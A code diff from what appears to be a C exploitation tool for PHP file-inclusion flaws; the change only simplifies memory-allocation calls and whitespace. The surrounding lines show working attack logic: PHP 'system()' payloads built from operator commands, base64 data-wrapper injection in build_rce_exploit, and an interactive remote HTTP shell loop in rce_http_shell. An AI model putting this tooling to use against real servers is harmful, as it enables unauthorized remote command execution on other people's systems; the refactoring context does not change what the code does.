@@ -113,7 +113,7 @@ void build_rce_exploit(CURL *curl, const char *php_code, rce_type tech, GET_DATA
 
 		b64x = b64_encode(php_code);
 		uri_encode = curl_easy_escape(curl, b64x, strlen(b64x));
-		base_64_xpl = xmalloc( ( strlen(uri_encode)+ strlen(DATA_WRAP) + 1)*sizeof(char) );
+		base_64_xpl = xmalloc( strlen(uri_encode)+ strlen(DATA_WRAP) + 1 );
 
 		strcpy(base_64_xpl, DATA_WRAP);
 		strcat(base_64_xpl, uri_encode);
@@ -142,7 +142,7 @@ bool check_error(const char *body){
 
 	len = get_max_len(regex_file);
 
-	line = xmalloc( (len+1)* sizeof(char) );
+	line = xmalloc( len+1 );
 
 	while( readline(regex_file, line, len) ){
 		if(!line[0])
@@ -494,9 +494,9 @@ int check_files(GET_DATA *GetParameters, size_t p_len, char *base_uri, int p){
 
 	alloc_len = get_max_len(file_check);
 
-	line = xmalloc( (alloc_len+1) * sizeof(char) );
-	file = xmalloc( (alloc_len+1) * sizeof(char) );
-	regex = xmalloc( (alloc_len+1) * sizeof(char) );
+	line = xmalloc( alloc_len+1 );
+	file = xmalloc( alloc_len+1 );
+	regex = xmalloc( alloc_len+1 );
 
 
 	while( readline( file_check, line, alloc_len ) ){
@@ -588,7 +588,7 @@ void exec_php(xpl_parameters xpl){
 
 	if(xpl.cmdx){
 		aux_len = 29+strlen(xpl.cmd);
-		aux = xmalloc( aux_len*sizeof(char) );
+		aux = xmalloc( aux_len );
 		snprintf(aux, aux_len,"<?php system(\"%s 2>&1\"); ?>", xpl.cmd);
 		rce_code_exec = make_code(r_str, aux, (xpl.tech == AUTH) ? true : false);
 		xfree(aux);
@@ -714,9 +714,9 @@ void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
 
 		if(!strcmp(cmd, "exit"))
 			break;
-			
+
 		aux_len = 29+nbytes;
-		aux = xmalloc( aux_len * sizeof(char) );
+		aux = xmalloc( aux_len );
 		snprintf(aux, aux_len, "<?php system(\"%s\"); ?>", cmd );
 		php_code = make_code(ran_str, aux, (tech == AUTH) ? true : false);
 		xfree(aux);
@@ -726,7 +726,7 @@ void rce_http_shell(const char *rce_uri, rce_type tech, const char *p_name){
 		} else {
 			if( (x = get_random_file(10, random_file))== NULL )
 				die("error while generate random file",0);
-				
+
 			curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)x);
 		}
 
@@ -791,7 +791,7 @@ int common_error_check(const char *uri){
 
 	alloc_size = get_max_len(fh_error);
 
-	error = xmalloc( (alloc_size+1) * sizeof(char) );
+	error = xmalloc( alloc_size+1 );
 
 	init_str(&body);
 
